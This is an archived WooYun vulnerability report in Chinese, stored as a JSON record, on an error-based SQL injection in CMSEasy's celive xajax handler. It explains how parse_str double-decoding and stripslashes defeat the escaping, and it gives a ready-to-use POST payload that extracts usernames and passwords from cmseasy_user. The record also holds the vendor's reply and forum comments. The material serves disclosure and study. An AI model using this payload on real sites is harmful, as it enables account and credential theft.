{"id": 71272, "wybug_id": "wooyun-2015-0137013", "wybug_title": "cmseasy 无限制报错注入（php函数的坑）", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2015-08-26 10:30", "wybug_open_date": "2015-11-24 10:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向公众公开  简要描述： cmseasy 无限制报错注入（可获取全站信息exp） 详细说明：  问题还是出在clive 上面，但是跟以往的不同的是，xjxquery 这个上面就发生了问题，看代码：xajax.class.php:\nif ($rootTag == \"xjxquery\") {            $sQuery = \"\";            $this->iPos++;            while (!stristr($this->aObjArray[$this->iPos], \"</xjxquery>\")) {                if (stristr($this->aObjArray[$this->iPos], \"<q>\") || stristr($this->aObjArray[$this->iPos], \"</q>\")) {                    $this->iPos++;                    continue;                }                $sQuery .= $this->aObjArray[$this->iPos];                $this->iPos++;            }            parse_str($sQuery, $aArray);            if ($this->bDecodeUTF8Input) {                foreach ($aArray as $key => $value) {                    $aArray[$key] = $this->_decodeUTF8Data($value);                }            }            if (get_magic_quotes_gpc() == 1) {                $newArray = array();                foreach ($aArray as $sKey => $sValue) {                    if (is_string($sValue))                        $newArray[$sKey] = stripslashes($sValue);                    else                        $newArray[$sKey] = $sValue;                }                $aArray = $newArray;            }        }        return $aArray;    }\n问题发生在哪里了：parse_str($sQuery, $aArray);这个函数，本身会对url编码进行一次decode的 测试一下\n<?php echo $_GET['b'];echo \"<br>\";parse_str($_GET['b']);echo $a;?>\n\n\n成立第二处逻辑如果gpc开启的话，它会进行一次stripslashes\nif (get_magic_quotes_gpc() == 1) {                $newArray = array();                foreach ($aArray as $sKey => $sValue) {                    if (is_string($sValue))                        $newArray[$sKey] = stripslashes($sValue);\n以往的 注册函数有两个前台可以利用：Postdata 和  LiveMessage看看LiveMessage：\nfunction LiveMessage($a) {    global $db;    $sessionid = $_SESSION['sessionid'];    $name = addslashes(htmlspecialchars($a['name']));    $email = addslashes(htmlspecialchars($a['email']));    $country = addslashes(htmlspecialchars($a['country']));    $phone = addslashes(htmlspecialchars($a['phone']));    $departmentid = addslashes(htmlspecialchars($a['departmentid']));    $message = addslashes(htmlspecialchars($a['message']));\n所有的参数都被addslashes我们在看看：Postdata function Postdata($a) {    global $db;    $chatid = $_SESSION['chatid'];    $name = $_SESSION['name'];    $a['detail'] = htmlspecialchars($a['detail']);    if (!get_magic_quotes_gpc()) {        $a['detail'] = addslashes($a['detail']);    }如果gpc开启的话，就不进行addslashes  好的 直接exp发送url:http://localhost/Cmseasy/celive/live/header.phppostdata:xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520cmseasy_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520</q></xjxquery>\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-26 10:35 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-26 10:31 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  前排！    \n     2015-08-26 10:31 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1234 漏洞数:122        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  大牛发洞了 前排    \n     2015-08-26 10:32 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:222 漏洞数:48        | 我是残废，啦啦啦啦)\t\t \n  前排出售瓜子花生    \n     2015-08-26 10:36 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  mark    \n     2015-08-26 11:02 |    \t\t木惘然 \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:34        | 欠下的约定)\t\t \n  什么函数    \n     2015-09-02 11:45 |    \t\tSunshie \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:11        | http://phpinfo.me)\t\t \n  什么函数     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}